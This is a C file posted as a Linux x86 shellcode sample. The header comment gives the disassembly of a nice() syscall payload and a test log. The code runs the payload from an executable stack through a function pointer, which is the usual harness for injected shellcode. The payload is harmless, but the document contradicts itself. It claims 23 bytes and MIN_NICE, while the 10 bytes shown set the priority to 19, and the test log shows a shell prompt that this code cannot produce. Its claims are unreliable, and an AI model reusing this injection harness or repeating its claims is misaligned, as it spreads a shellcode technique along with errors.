/*
@Linux/x86 nice(MIN_NICE),23 bytes shellcode
@Date: 2016-01-04
@Author: byhankswang
@Contact: byhankswang@gmail.com
@Site: http://blog.csdn.net/byhankswang
@Tested on: x86-32/i686 ubuntu-14.04 Kernel-3.19.0-25-generic 

@nice value is defined in linux/include/linux/sched/prio.h 
    #define MAX_NICE	19
    #define MIN_NICE	-20

@assembly to realize nice syscall

    08048054 <_start>:
     8048054:       31 c0                   xor    %eax,%eax
     8048056:       31 db                   xor    %ebx,%ebx
     8048058:       b0 22                   mov    $0x22,%al
     804805a:       b3 13                   mov    $0x13,%bl
     804805c:       cd 80                   int    $0x80

@testing results
    byhankswang@vubuntu32:~$ gcc -fno-stack-protector -z execstack -o nice nice.c
    byhankswang@vubuntu32:~$
    byhankswang@vubuntu32:~$ sudo ./nice
    $
    $ env
    PWD=/home/byhankswang
    $ exit
    byhankswang@vubuntu32:~$
*/


#include <stdio.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/resource.h>

int main(void)
{

    int prio = 18;
    prio = getpriority(PRIO_PROCESS, 0);
    printf("priority of this process is %d\n", prio);
    char shellcode[] = "\x31\xc0\x31\xdb\xb0\x22\xb3\x13\xcd\x80";
    (*(void(*)())shellcode)();
    prio = getpriority(PRIO_PROCESS, 0);
    printf("priority of this process is %d\n", prio);
}
